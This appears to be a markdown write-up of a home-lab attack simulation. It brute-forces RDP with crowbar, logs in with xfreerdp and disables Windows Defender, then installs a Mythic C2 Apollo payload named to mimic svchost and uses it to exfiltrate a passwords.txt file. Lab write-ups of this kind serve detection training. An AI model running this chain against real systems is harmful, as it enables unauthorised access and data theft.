@@ -1,0 +1,97 @@
+### **Infrastructure Setup**
+#### Mythic Server:
+- **OS:** Ubuntu Server 22.04  
+- **Hostname:** `TechGneek-Mythic`  
+- **Public IP:** `149.28.236.144`  
+- **Specs:** 80GB storage, 2 vCPU, 4GB RAM  
+- **Firewall Group:**  
+  - **Name:** `TechGneek-Mythic-Firewall`  
+  - **Rules:** TCP/1-65535 for SOC Analyst IP, Windows Server, and SSH Linux Server  
+- **Mythic Web GUI:** [Mythic GUI](https://149.28.236.144:7443)
+
+#### Target Windows Server:
+- Created a `passwords.txt` file containing the password `Winter2024!`.
+- Changed the server password to `Winter2024!` for simulation purposes.
+
+#### Attack Machine:
+- **OS:** Kali Linux (VM Fusion)  
+
+---
+
+### **Phase 1: Bruteforce Attack on RDP**
+
+#### **Kali Linux Commands**
+```bash
+sudo apt-get update && sudo apt-get upgrade -y
+cd /usr/share/wordlists
+sudo gunzip rockyou.txt.gz
+sudo head -50 rockyou.txt > ~/techgneek-wordlists.txt
+nano techgneek-wordlists.txt # Add 'Winter2024!' to the list
+sudo apt-get install -y crowbar
+nano target.txt # Add Windows Server IP and username
+sudo crowbar -b rdp -u Administrator -C techgneek-wordlists.txt -s 107.191.42.102/32
+```
+- **Tags Explanation:**
+  - `-b rdp`: Specifies brute force attack for RDP protocol.
+  - `-u Administrator`: Username to target.
+  - `-C techgneek-wordlists.txt`: Wordlist for brute force.
+  - `-s 107.191.42.102/32`: Target Windows server IP.
+
+---
+
+### **Phase 2: RDP Login**
+- Successfully logged into the Windows server via RDP:
+  ```bash
+  xfreerdp /u:Administrator /p:Winter2024! /v:107.191.42.102:3389
+  ```
+
+---
+
+### **Phase 3: Disabling Windows Defender**
+- Disabled Windows Defender to bypass security and continue exfiltration.
+
+---
+
+### **Phase 4: Mythic C2 Setup**
+
+#### **Mythic Installation Commands**
+```bash
+apt-get update && apt-get upgrade -y
+apt install docker-compose make
+git clone https://github.com/its-a-feature/Mythic
+cd Mythic
+./install_docker_ubuntu.sh
+sudo ./mythic-cli start
+sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
+```
+- Generated payload:
+  - **Type:** Apollo WinExe  
+  - **Name:** `svchost-techgneek.exe`
+
+---
+
+### **Phase 5: Exfiltrating Payload to Windows Server**
+- **Commands:**
+  ```bash
+  python3 -m http.server 9999
+  wget https://149.28.236.144:7443/direct/download/svchost-techgneek.exe --no-check-certificate
+  mv svchost-techgneek.exe 1/
+  ufw allow 9999
+  ```
+
+---
+
+### **Phase 6: File Exfiltration**
+- Transferred the payload and executed it on the target Windows server.
+- Successfully exfiltrated the `passwords.txt` file using Mythic's callback feature:
+  ```bash
+  download C:\Users\Administrator\Documents\passwords.txt
+  ```
+### **Summary**
+This project highlights:
+1. How to set up a Mythic C2 server and create custom payloads.
+2. The execution of brute force and file exfiltration phases.
+3. The importance of implementing strong detection mechanisms and securing critical systems.
+
+For additional details, visit the [TechGneek GitHub Repository](https://github.com/techgneek).
